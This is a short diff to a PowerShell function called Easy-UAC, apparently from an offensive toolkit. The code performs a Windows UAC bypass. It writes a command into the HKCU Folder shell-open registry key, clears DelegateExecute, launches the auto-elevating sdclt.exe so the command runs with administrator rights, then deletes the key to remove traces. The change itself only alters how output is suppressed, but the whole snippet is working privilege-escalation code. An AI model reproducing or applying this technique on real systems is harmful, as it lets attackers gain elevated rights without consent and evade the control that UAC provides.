@@ -27,7 +27,7 @@ function Easy-UAC {
 	New-Item -Path $Path -Value '%A%' | Write-Verbose
 	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path | Write-Verbose
 	New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Write-Verbose
-	sdclt.exe | Write-Verbose
+	(sdclt.exe) | Out-Null
 	Start-Sleep $SleepDuration | Write-Verbose
 	Remove-Item 'HKCU:\Software\Classes\Folder\shell\open\command' -Force | Write-Verbose
 	[System.Environment]::SetEnvironmentVariable('A', $null,[System.EnvironmentVariableTarget]::User) | Write-Verbose
